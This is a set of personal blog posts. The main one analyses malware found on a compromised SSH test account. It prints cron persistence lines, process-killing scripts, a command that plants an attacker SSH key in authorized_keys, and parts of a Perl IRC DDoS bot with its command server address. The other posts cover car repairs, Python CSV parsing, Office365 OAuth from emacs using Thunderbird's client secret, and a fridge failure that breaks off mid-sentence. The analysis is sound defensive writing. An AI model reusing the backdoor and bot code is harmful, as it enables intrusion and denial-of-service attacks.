[{"categories":["Coding"],"contents":"I got hacked.\nThere are all kinds of fun exploits people use to get into systems they\u0026rsquo;re not supposed to be in. In my case they used ssh. Normally ssh is secure. None of my passwords are brute-forceable. (Yes, you shouldn\u0026rsquo;t have public-facing password ssh\u0026hellip; but that\u0026rsquo;s no fun when you\u0026rsquo;re on someone else\u0026rsquo;s computer and need to get in in a hurry.) But in a moment of weakness I had needed a blank slate to test an environment regression against. So I did useradd test with the password test, and set up a home directory and shell. It was only supposed to last ten minutes. I suppose I must have been called away.\nEarlier I came to the computer to find this:\nWell that\u0026rsquo;s not good. What on earth is kswapd0 complaining about? There\u0026rsquo;s plenty of ram. Must be a pessimal case from a memory leak in the browser; although curiously toggling swap (swapoff -a and then swapon -a) didn\u0026rsquo;t seem to kill it. But I was in a hurry and doing something else, so I rebooted the computer and walked away.\nWhen I came back, kswapd0 was still causing problems. And surely it shouldn\u0026rsquo;t run under the user test? I assumed test was a (poorly named) system user, but no, su test prompts for a password and sudo su test; cd ~ gets me a home directory with things I clearly put there, and fish as a shell (which no system account would have). Oh, and it\u0026rsquo;s ./kswapd0: surely no kernel service would use relative paths (or even paths at all?).\nAt this point it slowly dawned on me what had happened. I unplugged the ethernet cable and went looking: what was happening?\nAnalysis There were two processes running for test: ./kswapd0 and rsync. /proc/N/cmdline gave the expected names, but readlink -f /proc/$RSYNCPID/exe was /usr/bin/perl. Oh no. What on earth were they running? Fortunately readlink -f /proc/$KSWAPD0PID/exe took me straight to the directory with the code in, and it could be copied before killing the processes (which didn\u0026rsquo;t endeavour to clean up).\nI didn\u0026rsquo;t delete test just yet. After all, the damage is done, and the ethernet is pulled. Rather I went looking inside .configrc (sic!) which contained two directories (imaginatively named a and b) and two files: crond.d and dir2.dir. dir2.dir just contained the path to its directory, but cron.d contained the following:\n1 1 */2 * * /home/test/.configrc/a/upd\u0026gt;/dev/null 2\u0026gt;\u0026amp;1 @reboot /home/test/.configrc/a/upd\u0026gt;/dev/null 2\u0026gt;\u0026amp;1 5 8 * * 0 /home/test/.configrc/b/sync\u0026gt;/dev/null 2\u0026gt;\u0026amp;1 @reboot /home/test/.configrc/b/sync\u0026gt;/dev/null 2\u0026gt;\u0026amp;1 0 0 */3 * * /tmp/.X25-unix/.rsync/c/aptitude\u0026gt;/dev/null 2\u0026gt;\u0026amp;1 Ah. The two @reboot lines are what start the code on boot; I didn\u0026rsquo;t even know there was such a thing as @reboot. The first line just runs the same code as the reboot at 1 minute past 1 am every other day, presumably in case it dies or is killed. The third line is the same as the fourth line, but runs weekly. The fifth line is more interesting: it calls a file which is clearly created by the others every third day at midnight. This file pretends to be aptitude (I run arch, so that would have raised eyebrows). It\u0026rsquo;s probably the phone-home code. Fortunately it hasn\u0026rsquo;t run, because kswapd0 used so much cpu I spotted it instantly.\nReverse Engineering a/upd contains the following:\n#!/bin/sh cd /home/test/.configrc/a if test -r /home/test/.configrc/a/bash.pid; then pid=$(cat /home/test/.configrc/a/bash.pid) if $(kill -CHLD $pid \u0026gt;/dev/null 2\u0026gt;\u0026amp;1) then exit 0 fi fi ./run \u0026amp;\u0026gt;/dev/null Other than the complete lack of indentation, this is easy: it tries to read the current pid from a file and kill the process, and then start it. So now to a/run:\n#!/bin/bash ./stop #./init0 sleep 10 pwd \u0026gt; dir.dir dir=$(cat dir.dir) ARCH=`uname -m` if [ \u0026#34;$ARCH\u0026#34; == \u0026#34;i686\u0026#34; ]; then nohup ./anacron \u0026gt;\u0026gt;/dev/null \u0026amp; elif [ \u0026#34;$ARCH\u0026#34; == \u0026#34;x86_64\u0026#34; ]; then ./kswapd0 fi echo $! \u0026gt; bash.pid Look at that! Even malicious code ships with commented out lines!\nHere again everything is simple. We try to stop previous instances, sleep for a bit to let everything calm down, and then start one of two scripts. ./anacron (which obviously isn\u0026rsquo;t anacron) wasn\u0026rsquo;t shipped, but we do have ./kswapd0. Firstly, though, let\u0026rsquo;s look at ./stop:\n#!/bin/sh pkill -9 cron killall -9 cron kill -9 `ps x|grep cron|grep -v grep|awk \u0026#39;{print $1}\u0026#39;`\u0026gt;.proc pkill -9 kswapd0 killall -9 kswapd0 kill -9 `ps x|grep kswapd0|grep -v grep|awk \u0026#39;{print $1}\u0026#39;`\u0026gt;.proc pkill -9 ld-linux killall -9 ld-linux kill -9 `ps x|grep ld-linux|grep -v grep|awk \u0026#39;{print $1}\u0026#39;`\u0026gt;.proc pkill -9 Donald killall -9 Donald kill -9 `ps x|grep Donald|grep -v grep|awk \u0026#39;{print $1}\u0026#39;`\u0026gt;.proc pkill -9 xmr killall -9 xmr kill -9 `ps x|grep xmr|grep -v grep|awk \u0026#39;{print $1}\u0026#39;`\u0026gt;.proc pkill -9 xm64 killall -9 xm64 kill -9 `ps x|grep xm64|grep -v grep|awk \u0026#39;{print $1}\u0026#39;`\u0026gt;.proc rm -rf .proc Oops. They don\u0026rsquo;t know if we have pkill or killall. So here are three redundant copy-pasted ways to kill lets of things. The third line should always work, since it only depends on ps, which is POSIX, so the other two are pointless. It\u0026rsquo;s rather crude, and written by someone who doesn\u0026rsquo;t like spaces: ps x prints the processes, then one grep filters them, another grep (!) filters out the first grep instance (which will also match, because | is a stream so ps is still running when grep starts its work) and then awk gets the pid. This is saved to a file we promptly remove, which is odd enough, but haven\u0026rsquo;t they just leaked the names of a bunch of dodgy executables? Including one called Donald, which is weird enough. I wonder which Donald that could be? Probably Donald Duck.\nAlso, DRY, Russian hackers.\nfile kswapd0 tells us it\u0026rsquo;s a binary, so we\u0026rsquo;ll come back to that one.\n\u0026lsquo;Obfuscated\u0026rsquo; Italian Perl Meanwhile, what about b?\nb/sync, the entrypoint, contains the following pointless code:\n#!/bin/sh cd /home/test/.configrc/b ./run Ah well. I guess this is a kind of security by constant redirect. run contains this:\necho $VeryLongBase64EncodedString | base64 --decode | perl cd ~ \u0026amp;\u0026amp; rm -rf .ssh \u0026amp;\u0026amp; mkdir .ssh \u0026amp;\u0026amp; echo \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\u0026#34;\u0026gt;\u0026gt;.ssh/authorized_keys \u0026amp;\u0026amp; chmod -R go= ~/.ssh Let\u0026rsquo;s hope that\u0026rsquo;s not their only public key :p Charming username, too. Also not FQDN, how rude. The very long base64 encoded string decodes to the following perl:\neval unpack $VeryLongPerlString Hmm. No, I don\u0026rsquo;t think I will. What about print for eval?\nAnd neatly formatted (for once!) indented perl drops out onto the terminal. Oh. So after all that effort, in the language which is famous for stupid obfuscations, they didn\u0026rsquo;t bother? Nice, I guess.\nHere is some of it:\nmy $processo = \u0026#39;rsync\u0026#39;; $servidor=\u0026#39;45.9.148.99\u0026#39; unless $servidor; my $porta=\u0026#39;443\u0026#39;; my @canais=(\u0026#34;#007\u0026#34;); my @adms=(\u0026#34;polly\u0026#34;,\u0026#34;molly\u0026#34;); my @auth=(\u0026#34;localhost\u0026#34;); my $linas_max=6; my $sleep=3; my $nick = getnick(); my $ircname = getnick(); my $realname = (`uname -a`); my $acessoshell = 1; my $prefixo = \u0026#34;! \u0026#34;; my $estatisticas = 0; my $pacotes = 1; my $VERSAO = \u0026#39;0.2a\u0026#39;; $SIG{\u0026#39;INT\u0026#39;} = \u0026#39;IGNORE\u0026#39;; $SIG{\u0026#39;HUP\u0026#39;} = \u0026#39;IGNORE\u0026#39;; $SIG{\u0026#39;TERM\u0026#39;} = \u0026#39;IGNORE\u0026#39;; $SIG{\u0026#39;CHLD\u0026#39;} = \u0026#39;IGNORE\u0026#39;; $SIG{\u0026#39;PS\u0026#39;} = \u0026#39;IGNORE\u0026#39;; This is not much better than the obfuscated string before. Really, obfuscating perl is a bit of a joke\u0026mdash;it\u0026rsquo;s hard enough to read on a good day. But these programmers have gone a step further. They have used portugese. Definitely not Russian hackers, then. No russian would write die \u0026quot;Problema com o fork: $!\u0026quot; unless defined($pid);.\nWhat follows is an IRC bot, in a horrible language (perl, not portugese) which someone has tried hard to make readable with indentation and all the other things we do to make up for a language which thinks @_ and $_ is decent syntax. The chatbot sits there waiting for messages in the IRC chat:\nsub parse { my $servarg = shift; if ($servarg =~ /^PING \\:(.*)/) { sendraw(\u0026#34;PONG :$1\u0026#34;); } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) { if ($args =~ /^\\001VERSION\\001$/) { elsif ($args =~ /^\\001PING\\s+(\\d+)\\001$/) { elsif (grep {$_ =~ /^\\Q$pn\\E$/i } @adms) { if ($onde eq \u0026#34;$meunick\u0026#34;){ elsif ($args =~ /^(\\Q$meunick\\E|\\Q$prefixo\\E)\\s+(.*)/ ) { if ($arg =~ /^\\!(.*)/) { } elsif ($arg =~ /^\\@(.*)/) { } else { } } } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) { if (lc($1) eq lc($meunick)) { } elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) { } elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) { foreach my $canal (@canais) { } } I\u0026rsquo;ve taken out all the code here, but it\u0026rsquo;s not hard to make sense of: there\u0026rsquo;s code to respond to pings, to execute arbitrary shell commands and return, to join irc channels, to print the version\u0026mdash;notice(\u0026quot;$pn\u0026quot;, \u0026quot;\\001VERSION mIRC v6.16 ENE ALIN GABRIEL\\001\u0026quot;); (Does this name mean anything?)\u0026mdash;and to do a bunch of other irc admin tasks. There\u0026rsquo;s also code to send debug statistics, although it\u0026rsquo;s off by default. But really. Even perl supports better control flow than this horrible bunch of nested mess.\nThen we find the following fun function (\u0026lsquo;subroutine\u0026rsquo;):\nsub attacker { my $iaddr = inet_aton($_[0]); my $msg = \u0026#39;B\u0026#39; x $_[1]; my $ftime = $_[2]; my $cp = 0; my (%pacotes); $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0; Yep, it\u0026rsquo;s a DDOS bot, with arbitrary command execution for fun. And that\u0026rsquo;s it, other than loads and loads of code to manage IRC channels, kicking and finding users etc. If I had to guess, someone took a portugese IRC bot written in perl (for some unknown reason) and modified it crudely to be an attack payload. But who knows, maybe they also use your computer to manage IRC channels?\nThe binary I have yet to dissassemble the binary. As a guess I reckon it\u0026rsquo;s a bitcoin miner: it used a lot of cpu, but nothing so far really fits an attempted ransomware attack, and linux is a poor platform for such attacks: permissions mean you can basically only encrypt your own home directory. Of course there are elevation exploits, but there\u0026rsquo;s no indication they tried any here. Likewise exfiltration is possible, although there\u0026rsquo;s nothing they could read I really care about, but again there\u0026rsquo;s no evidence it happened.\nIf/when I get round to reverse engineering the binary, I\u0026rsquo;ll update here.\nPrognosis The system is safe. test was a stupid user account, let\u0026rsquo;s get rid of it:\nsudo userdel test No more exploit. They could have done something worse, and I should probably nuke from orbit. But I found the usual password-spraying attacks. In the long run I should go back to disabling password auth entirely, but in the short-term installing fail2ban provides agreeable catharsis:\nsudo fail2ban-client banned [{\u0026#39;sshd\u0026#39;: [\u0026#39;178.128.184.213\u0026#39;, \u0026#39;45.154.12.139\u0026#39;, \u0026#39;115.254.63.50\u0026#39;, \u0026#39;113.21.232.39\u0026#39;, \u0026#39;23.95.215.44\u0026#39;, \u0026#39;43.154.26.210\u0026#39;, \u0026#39;49.0.129.3\u0026#39;, \u0026#39;45.64.112.96\u0026#39;, \u0026#39;152.32.150.45\u0026#39;, \u0026#39;210.195.100.138\u0026#39;, \u0026#39;183.94.133.168\u0026#39;, \u0026#39;157.230.218.88\u0026#39;, \u0026#39;175.139.245.205\u0026#39;]}] I was lucky; this was a low-intensity attack; there\u0026rsquo;s nothing else odd in the logs.\nTakeaways Dev machines are going to have silly things like adduser test run on them. Don\u0026rsquo;t combine dev machines with public gateway servers. Protect them with ssh keys and default-deny security.\nOh, and do use permissions, and encrypt stuff which actually matters, and have proper backups\u0026mdash;ideally initiated from the backup server, not the device, which shouldn\u0026rsquo;t have write access to the server.\nAnd watch out for portugese IRC bots. You don\u0026rsquo;t know where they\u0026rsquo;ve been.\n","permalink":"https://2e0byo.github.io/post/coding/hacked/","tags":null,"title":"Hacked"},{"categories":["Repairs","Engineering"],"contents":"Like many ageing Honda Civics our VSA and ABS lights have been coming on sporadically for the last few months. Now they\u0026rsquo;re stuck on all the time.\nFirst I suspected the battery, so I duly measured the no-load voltage (~12.6V: not great, but not awful either), the voltage dip when running the fuel pumps, (~11.6V) and the voltage dip when starting (briefly around 10V, but I didn\u0026rsquo;t have a scope on it). Yep, the battery is ageing. What about its internal resistance? Everyone did this at school, right\u0026mdash;you put a load across the battery, measure the current through the load and the voltage across the terminals before and after; then you assume that voltage was dropped across the internal resistance and do R=V/I. The trouble is that the voltage drop is tiny, so you need a reasonable current. I couldn\u0026rsquo;t find any decent loads, but any load will do if you have an ammeter in series, so I disconnected the negative lead and used the car itself. Since the alarm promptly started going off (next time lock the car door!) that formed one data point, and then I turned the running lights on for the other. With the multimeter in relative mode even the subtraction was done for me:\ndV I R 0.06V 0.9A 67mOhm 0.3 6A 50mOhm Neither is ideal, but both are perfectly respectable for a starting battery. Anyhow, it seems that measuring battery health this way is a pretty dark science\u0026mdash;one paper I saw claimed that the usual means of measuring AC impedance and then taking the real component gave wildly different values from the DC resistance, so when I found the batteries had died (!) in my capacitor ESR meter I put it back. It\u0026rsquo;s not calibrated, so I would have had to find a bunch of 10ohm resistors to make up a 100mOhm calibration unit, anyhow.\nFurther confirmation that it\u0026rsquo;s not the battery came when trying with a charger across it, and a lithium ion jumpstarter which once rescued us on a motorbike on the side of the road. The warning lights refused to go away. There\u0026rsquo;s a procedure for resetting them without a code reader\u0026mdash;ground the SDS pin on the odb connector or stuff some foil in the socket for the same purpose on the fusebox and play with the brake and the key. It clearly worked, but the light came straight back again.\nThus I turned to the sensors themselves.\nAll the wheels are different, to be annoying, and I had to work one wheel at a time as the pavement grounds my low profile jack on one side. I also jacked from the pinch welds for the first time and promptly bent them flat, but never mind, they\u0026rsquo;ll work just as well like that. I mostly use them for axle stands anyway.\nWith some wires and a lot of annoying poking around I managed to get connections to both the hidden pins and the hidden sockets. Front right worked perfectly:\nMy notes claim the sensor measured 1.5 M Ohms, but on the basis that the other three working sensors were in the 280-300k range I wonder if I didn\u0026rsquo;t misread. Here you can see the search protocol from the abs controller:\n(Apologies for the trace being upside down.) There are two 11V peaks, which clearly are used to measure drawn current, and then if the sensor is detected the line is held high at 11v and the wheel movements are modulated on to it. The rear right sensor had the two peaks (so the wiring\u0026rsquo;s good) but nothing I could do could make it stay high after that. The sensor also measures 2 M Ohms (hence the comment about misreading the front right).\nThus a new sensor is in the post for £10, and we\u0026rsquo;ll have to see if it can be fitted easily. These sensors are very simple\u0026mdash;hall effect probes\u0026mdash;so hopefully the inside of the drum isn\u0026rsquo;t full of rust or something preventing it working. The outside of the brake and the whole rear of the car certainly shows its age.\nAnd digital oscilloscopes are really good fun\u0026mdash;this would have been a nightmare with the old crt scope. Now I just need to learn how to take screenshots without the screenshot bar on the right hand side\u0026hellip;\n","permalink":"https://2e0byo.github.io/post/repairs/abs-sensor/","tags":null,"title":"Tracking down a faulty ABS sensor"},{"categories":["Repairs","vehicles"],"contents":"Halfway down the country, at 7.30 in the morning (having been on the road since 5.30) the key stopped turning in the ignition. We have an old (\u0026lsquo;06) Honda Civic, and the AA man blamed the age. He was able to force the key round, doing much the same thing I\u0026rsquo;d been doing, only more effectively, and we drove on, to repeat the same rigmarole the next time it was started. The AA had been free (it turned out the car had cover from being serviced at a Honda dealership), but a locksmith wasn\u0026rsquo;t going to be. Thus I ran to screwfix and bought a screwdriver and removed the plastics in a slightly wet carpark in Bedford: but I couldn\u0026rsquo;t get the last screw to get the antenna off the barrel, and anyhow it wasn\u0026rsquo;t coming without more tools. Thus after fighting for long enough it turned, and the car was driven down to London and put in the garage; and we went off on holiday.\nWhen we got back the spare key (sent down from Durham in the interval by a friendly landlord) was no more effective at turning the lock, so it clearly had to come out. Here is the inside of a civic without some of the panelling:\nThe ignition barrel is under the plastic parts, partially hidden by the indicator assembly, which is screwed to the ignition + steering lock assembly, itself secured to the steering column with \u0026lsquo;anti-theft\u0026rsquo; shear-head bolts. On which more later.\nThe first thing was to dismount the plastic, which involved filing a square head on one of the screws (the one directly between the key antenna and the indicator assembly) after which it could be worked out with a spanner and molegrips. Then a small hole is drilled in the casting, and a locking dowel pin (2mm split pin/roll pin) can be tapped out with a nail. I am an idiot and mistook the barrel/housing seam for the edge of the casting and driller the first hole too high up, drilling another just below it and weakening the casting needlessly. I have since found a much better way of getting this pin out:\nThe roll pin can be removed by pulling it with fine tweezers, without drilling any holes.\nYou need a very finely pointed pair, and you poke one jaw inside the hollow pin; the other grips the outside and it comes straight out. One way or another, this is what it all looks like:\nI made a mistake withdrawing this lock which lead to another day\u0026rsquo;s work:\nWhen pulling the lock assembly out, leave the key out so the steering lock bar is as high as possible, and try to lift the bar over the assembly: if you pull the assembly inside the whole thing will have to come off.\nThat said I couldn\u0026rsquo;t get it out without the key.\nThis yielded the lock:\nDrill a hole to punch out the dowel pin.\nand the bad pin was immediately visible:\nI simply removed this pin, which resulted in a barrel which (with the less worn spare key) behaved itself:\nThe slots engage with the pins unless the correct key pulls them in, preventing the barrel from turning.\nWith this done the whole thing goes together and turns properly:\nAt this point I waited until Dad came home to show him the lock, only to put it in the car and find that it didn\u0026rsquo;t turn. Further research on youtube suggested that the steering lock had moved inside, and the only way to fix it was to take the whole assembly off. So I ground slots in the heads of the anti-theft bolts mounting the lock to the column:\nThis got us nowhere. After fighting with a screwdriver; trying to tap the bolts round with a punch; borrowing Grandad\u0026rsquo;s impact driver and hammering away at them; drilling a hole and trying a stud extractor (which I broke off in situ) I gave up. The left hand bolt could be drilled out; the right hand bolt, with the broken stud extractor trapped in it, was drilled all round the extractor in an attempt to loosen it, and then I tried tapping it\u0026mdash;and it turned! So that one unscrewed:\nfortunately we had another stud extractor.\nWhilst you are at it, take a picture of the key code so you can get another pristine key cut. Mine is behind this black rectangle:\nThen, since I had it apart again, I took the whole thing apart, packed it with grease, and then put it all back together again:\nAnd then put the whole assembly back together again, replacing the filed screw with a little allen head machine screw, which can be undone easier in the minimal clearance it has when mounted, in case I need to get it off again:\nWhen you slide the lock assembly in, press the steering lock below the surface of the housing, and it will click and let the whole thing go together. Then when you turn the key the steering lock will retract and you are home and dry.\nFor some reason there are no pictures of the final assembly, it\u0026rsquo;s as simple as screwing the indicators back on, bolting the bracket back down again (I avoided theft-free bolts\u0026mdash;I don\u0026rsquo;t have any anyhow\u0026mdash;but had to put spring washers under the bolts I used to prevent them jamming against the bracket), plugging everything back in, getting the plastic back on and then clearing up the enormous amount of mess I had made all over the car. And after all that it starts again.\nNone of the other pins look in as poor shape as the pin I took out (which was allowing the key to ride over it without moving at all). But sooner or later another will likely get there. One can get new pins from Honda (or some garages); or a new lock assembly from Ebay; or one could take all the pins out (or all but one) and count on a thief not noticing. It didn\u0026rsquo;t go all at once this time\u0026mdash;it started acting up the day before, and I stupidly ignored it\u0026mdash;so hopefully at the first sign of difficulty I can strip the whole thing down and have a look at it, before getting stranded.\nOh, and WD40 in any mechanism is only a temporary fix: WD40 means you have to strip the whole thing down and regrease. There was barely any grease left with all the WD40 I\u0026rsquo;d sprayed in trying to get it working again. WD40, by the way, is a rocket waterproofer and only a fairly rubbish oil. It leaves a residue. A proper oil\u0026mdash;or a spray grease\u0026mdash;is much better and much cheaper, albeit it doesn\u0026rsquo;t smell as good\n","permalink":"https://2e0byo.github.io/post/repairs/ignition-barrel/","tags":null,"title":"Ignition Barrel Repair"},{"categories":["Coding"],"contents":"I recently had to parse a csv file which looks like this:\n\u0026#34;key\u0026#34;,\u0026#34;val\u0026#34; \u0026#34;key\u0026#34;,\u0026#34;val\u0026#34; \u0026#34;key\u0026#34;,\u0026#34;val\u0026#34; \u0026#34;col1\u0026#34;,\u0026#34;col2\u0026#34;,\u0026#34;col3\u0026#34;,\u0026#34;col4\u0026#34; ... row data here The obvious, imperative solution would be:\nfrom csv import DictReader def parse(f): props = {} for line in f: if not line.strip(): break k, v = line.strip().replace(\u0026#39;\u0026#34;\u0026#39;, \u0026#34;\u0026#34;).split(\u0026#34;,\u0026#34;) props[k] = v reader = DictReader(f) data = list(reader) return props, data With the walrus operator we can save a few lines at the cost of non-obvious syntax:\ndef parse(f): props = {} while line := next(f).strip(): ... I suppose there might be people who think that is neat.\nWhat I did was instead:\nfrom itertools import takewhile def parse(f): props = { k: v for l in takewhile(str.strip, csvf) for k, v in [l.strip().replace(\u0026#39;\u0026#34;\u0026#39;).split()] } ... itertools.takewhile, predictably enough, takes values from an iterable while they satisfy some condition.\nStrangely, this dictcomp is neater to my eyes. It\u0026rsquo;s obvious what it does, where the values come from: in fact, I can read it a good deal easier than the previous version. After a moment I realised this would be even easier:\ndef parse(f): reader = csv.reader(f) props = {k:v for k, v in takewhile(bool, reader)} reader = csv.DictReader(f) data = list(reader) return props, data That, I think, is pleasingly declarative, functional and neat. Had I not been waiting for something else to finish I would likely have written the first option and gone with it. Sometimes, perhaps, it pays to think about obvious tasks like reading csv files.\n","permalink":"https://2e0byo.github.io/post/coding/python-is-sortof-functional/","tags":null,"title":"Python Is (sort-of) Functional"},{"categories":["Coding"],"contents":"A few weeks ago I received an email from the university stating:\nFurther to our previous communication advising about a change to basic authentication for Durham mailboxes, on 28th October 2021 we will be removing the ability to connect to University email via IMAP and our records indicate that you currently access email in this way.\nThis, apparently, is down to the fact that\nBasic authentication is no longer secure enough to support modern working as it does not support security features such as Multi-Factor Authentication (MFA). Using modern authentication will mean we can protect our mailboxes from unauthorised access, however, this does mean that email clients configured to use legacy authentication will stop working.\nThere is a contradiction here, of course: the allegedly more secure \u0026lsquo;modern authentication\u0026rsquo; has nothing whatsoever to do with IMAP. I went to sleep very cross at the idea that I might have to give up on IMAP, a protocol which works extremely well at fetching mail from a server, and replace it with something horrible like a davmail bridge. And all this because, apparently, my inbox is in enormous danger of being hacked. Given that email is sent in plaintext and is famously easy to MITM (hence all those spam emails coming from reputable servers) this is an interesting claim at the least. Last week a professor forwarded me an email from a student in one of my seminars which went:\nDear Prof. X,\n\u0026hellip; my username is \u0026lt;\u0026gt; and my password is \u0026lt;\u0026gt; \u0026hellip;.\nYours,\nY\nNot even oauth2 with multifactor authentication and tokens expiring every sixteen seconds making you type in codes which ping on the phone you inconveniently left at home can fix that security breach. But apparently that, and not teaching people that email is inherently public, and anything sent by email should be considered published, is the real security breach. Oh well.\nModern Authentication When I had a closer look, it turned out Durham were not \u0026lsquo;retiring IMAP\u0026rsquo; at all. They were retiring password authentication, which is completely different. In order to find this you have to log in (with MFA!) to a special website, which hosts\u0026hellip; a word document which one can\u0026rsquo;t download for some reason, explaining that you can use thunderbird. So I duly installed and fired up thunderbird, and it does indeed redirect me to a login page, take a code from the authenticator app, and then off we go. Thunderbird can do this, because it is registered as an app with microsoft, so they have a client id and \u0026lsquo;secret\u0026rsquo; in plaintext in their source code. Thus anyone can pretend to be thunderbird, and get a refresh token. Someone has already done the hard work of writing a script to do the original login and extract the refresh token from a redirect. After that \u0026lsquo;modern authentication\u0026rsquo; is just (X)OAUTH2. The basic idea is:\nyou get a refresh token by logging in to some auth page. The token is urlencoded into the page we redirect to. In this case, we just redirect to localhost and extract from the url (the browser shows an error, but the url is what we want).\nthe refresh token lets you get an access token by making a post request to the right authentication endpoint with the refresh token, and the client secret and id, which returns an access token valid until it expires.\nyou can then authenticate, by including the token, encoded in base64, specifically as\nbase64(\u0026#34;user=\u0026#34; + user + \u0026#34;^Aauth=Bearer \u0026#34; + token + \u0026#34;^A^A\u0026#34; ) IMAP I use offlineimap to download email. Once I figured out that the offlineimaprc file is not quite a python file\u0026mdash;specifically, it quotes by default, so adding quotes breaks things\u0026mdash;offlineimap started working again. Credit to the author of M365 for making it so easy.\nSMTP This was more interesting. I use mu4e inside emacs, so I send email with smtpmail. A long thread reveals that others have got oauth2 working with sendmail, and the patch has even made it upstream, and is already in my emacs:\n(cl-defmethod smtpmail-try-auth-method (process (_mech (eql xoauth2)) user password) (smtpmail-command-or-throw process (concat \u0026#34;AUTH XOAUTH2 \u0026#34; (base64-encode-string (concat \u0026#34;user=\u0026#34; user \u0026#34;\\1auth=Bearer \u0026#34; password \u0026#34;\\1\\1\u0026#34;) t)))) This is documented:\nThe process by which the SMTP library authenticates you to the server is known as “Simple Authentication and Security Layer” (SASL). There are various SASL mechanisms, and this library supports three of them: cram-md5, plain, login and xoauth2, where the first uses a form of encryption to obscure your password, while the other two do not. It tries each of them, in that order, until one succeeds. (xoauth2 requires using the oauth2.el library. You can override this by assigning a specific authentication mechanism to a server by including a key smtp-auth with the value of your preferred mechanism in the appropriate ~/.authinfo entry.\nThis is it. Examining smtpmail-auth-supported shows that for some reason this isn\u0026rsquo;t enabled by default. Thus we have to\n(add-to-list \u0026#39;smtpmail-auth-supported \u0026#39;xoauth2) Now smtpmail tries to retrieve the the access token from auth-store, which in turn looks it up in .authinfo.gpg, which looks something like:\nmachine outlook.office365.com login EMAIL port 587 smtp-auth xoauth2 password PASS Now, how do we get the access token? One option is just to put an access token in here. I ended up doing something else, which feels much less like a hack than putting a function in password and taking advantage of the fact that the content of password is wrapped up in a function and has to be called (in any case I couldn\u0026rsquo;t get this to work1, but it\u0026rsquo;s mentioned in the thread). First we have a very simple wrapper function to get the token:\n(defun get-access-token (auth) \u0026#34;Get access token. AUTH is a plist with the right keys from auth-search. Returns just the access token as a string extracted from the oauth2 struct.\u0026#34; (oauth2-token-access-token (oauth2-refresh-access (make-oauth2-token :refresh-token (funcall (plist-get auth :secret)) :token-url (plist-get auth :token-url) :client-id (plist-get auth :client-id) :client-secret (plist-get auth :client-secret))))) Then we put the right keys in our authinfo.gpg. I haven\u0026rsquo;t bothered hiding anything except the refresh token, but apparently a patch has made it/will make it upstream to allow you to specify more than one hidden field. Since this is stored in a gpg encrypted file it\u0026rsquo;s safe on disk anyhow. And anyhow the key storage for offlineimap is necessarily a lot less secure, since I want it to run without user interaction.\nThe trouble is that the method defined for xauth2 authentication in smtpmail depends on being given the token directly. I simply overrode it:\n(cl-defmethod smtpmail-try-auth-method (process (_mech (eql xoauth2)) user password) (smtpmail-command-or-throw process (let* ( ;; Get the auth entry manually so we can get the other secrets (auth (car (auth-source-search :user user :password password))) ;; Get token (token (get-access-token auth))) (concat \u0026#34;AUTH XOAUTH2 \u0026#34; (base64-encode-string (concat \u0026#34;user=\u0026#34; user \u0026#34;\\1auth=Bearer \u0026#34; token \u0026#34;\\1\\1\u0026#34;) t))))) This is a little crude: firstly we repeat the search smtpmail has already done in order to get the whole auth-source plist; then we get the first item (car), then we pass that up. Since refresh tokens are effectively unique, and I don\u0026rsquo;t have multiple accounts per fully-qualified username anyhow, collisions won\u0026rsquo;t occur, but this is still ugly, as the original search was able to use :host (stored in the auth-source file as machine, because\u0026hellip; well\u0026hellip;).\nOther than that it\u0026rsquo;s identical to the function shipped with smtpmail.\nCurrently offlineimap gets its refresh token from one place, and emacs from another. It might be better to read the refresh token from the same file in both cases, in case we ever need to change it. Reading file contents is surprisingly odd in emacs:\n(with-temp-buffer (insert-file-contents \u0026#34;path/to/file\u0026#34;) (buffer-string) ) On the other hand, I don\u0026rsquo;t think I\u0026rsquo;ll be at Durham long enough for them to refresh the refresh token.\nLegality So with the aid of Thunderbird\u0026rsquo;s not-so-secret application secret we can send and receive email. Is this legal? According to some claims in that thread, possibly not: apparently developers are not supposed to share their app secret, although how they are supposed to avoid doing so\u0026mdash;since after all the application does need to use it, and it runs on the user\u0026rsquo;s machine, so intercepting it will be very easy\u0026mdash;is unclear. Thunderbird apparently got round this by registering the app with the Legal Person of the organisation. Whether that was to avoid being sued individually, or to claim that they only shared it with themselves, I don\u0026rsquo;t know. In any case Micro$oft apparently don\u0026rsquo;t directly forbid \u0026rsquo;embedding the application secret in an opensource application\u0026rsquo; unlike Google.\nIn the longer run, the obvious solution is to host one\u0026rsquo;s own email server and stop worrying about all this.\nA previous version of this post suggested it did, but I had not realised emacs caches secrets. (auth-source-forget-all-cached) will get you back to a pristine state for testing.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://2e0byo.github.io/post/coding/modern-authentication/","tags":null,"title":"“Modern Authentication”: Outlook365 in Emacs"},{"categories":["Engineering"],"contents":"Refrigerate in peace, OpenFridge.\nThe hardware OpenFridge was controlling is no more. It now looks like this:\nHeat Exchange\nDoor\nObviously, it should not look like this. What follows is a post-mortem, because it is worth learning from one\u0026rsquo;s mistakes.\nThe final moments of a fridge After fixing the defrost I did not get around to replacing the blown thermal fuse. The Chinese sensors were supplied with some kind of wire which breaks if you so much as look at it, and I was afraid I would knock the wire at some point and crash the system. Two nights ago, putting something in the fridge, I knocked one block and wondered if I had indeed snapped the wire\u0026mdash;but I didn\u0026rsquo;t look. Last night my wife complained that the fridge was \u0026lsquo;melting\u0026rsquo;, at which point I assumed the sensor had indeed failed, and the fridge had used stale data and failed to cool. No, she meant the fridge was melting, or more specifically the freezer: the plastic has melted, flown 